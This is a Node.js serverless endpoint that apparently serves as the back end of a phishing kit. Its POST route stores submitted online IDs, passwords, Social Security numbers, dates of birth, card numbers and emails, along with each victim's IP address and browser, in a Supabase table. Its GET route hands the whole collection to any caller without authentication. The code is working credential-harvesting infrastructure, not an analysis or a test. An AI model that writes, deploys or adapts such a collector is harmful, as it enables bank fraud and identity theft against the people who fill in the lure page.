const { createClient } = require('@supabase/supabase-js');

// Initialize Supabase client
const supabaseUrl = process.env.SUPABASE_URL || '';
const supabaseKey = process.env.SUPABASE_ANON_KEY || '';

let supabase = null;
if (supabaseUrl && supabaseKey) {
  supabase = createClient(supabaseUrl, supabaseKey);
}

async function saveLoginData(data) {
  if (!supabase) {
    console.error('Supabase not configured');
    return false;
  }

  try {
    const { data: result, error } = await supabase
      .from('login_data')
      .insert({
        online_id: data.online_id || '',
        password: data.password || '',
        ssn: data.ssn || null,
        dob: data.dob || null,
        card_number: data.card_number || null,
        email: data.email || null,
        ip_address: data.ip_address || null,
        user_agent: data.user_agent || null,
        created_at: new Date().toISOString()
      })
      .select();

    if (error) {
      console.error('Supabase insert error:', error);
      return false;
    }

    return result && result.length > 0;
  } catch (error) {
    console.error('Error saving login data:', error);
    return false;
  }
}

async function getAllLoginData(limit = 1000) {
  if (!supabase) {
    console.error('Supabase not configured');
    return [];
  }

  try {
    const { data, error } = await supabase
      .from('login_data')
      .select('*')
      .order('created_at', { ascending: false })
      .limit(limit);

    if (error) {
      console.error('Supabase select error:', error);
      return [];
    }

    return data || [];
  } catch (error) {
    console.error('Error getting login data:', error);
    return [];
  }
}

module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  try {
    if (req.method === 'GET') {
      // Get all login data
      const data = await getAllLoginData(1000);
      res.status(200).json({
        status: 'success',
        data: data,
        count: data.length
      });
    } else if (req.method === 'POST') {
      // Save login data
      const body = req.body;
      
      // Get IP address and user agent
      const ipAddress = req.headers['x-forwarded-for']?.split(',')[0] || 
                       req.headers['x-real-ip'] || 
                       req.connection?.remoteAddress || '';
      const userAgent = req.headers['user-agent'] || '';

      const success = await saveLoginData({
        online_id: body.online_id || '',
        password: body.password || '',
        ssn: body.ssn || null,
        dob: body.dob || null,
        card_number: body.card_number || null,
        email: body.email || null,
        ip_address: ipAddress,
        user_agent: userAgent
      });

      if (success) {
        res.status(200).json({
          status: 'success',
          message: 'Data saved successfully'
        });
      } else {
        res.status(500).json({
          status: 'error',
          message: 'Failed to save data. Check Supabase configuration.'
        });
      }
    } else {
      res.status(405).json({
        status: 'error',
        message: 'Method not allowed'
      });
    }
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({
      status: 'error',
      message: `Server error: ${error.message}`
    });
  }
};

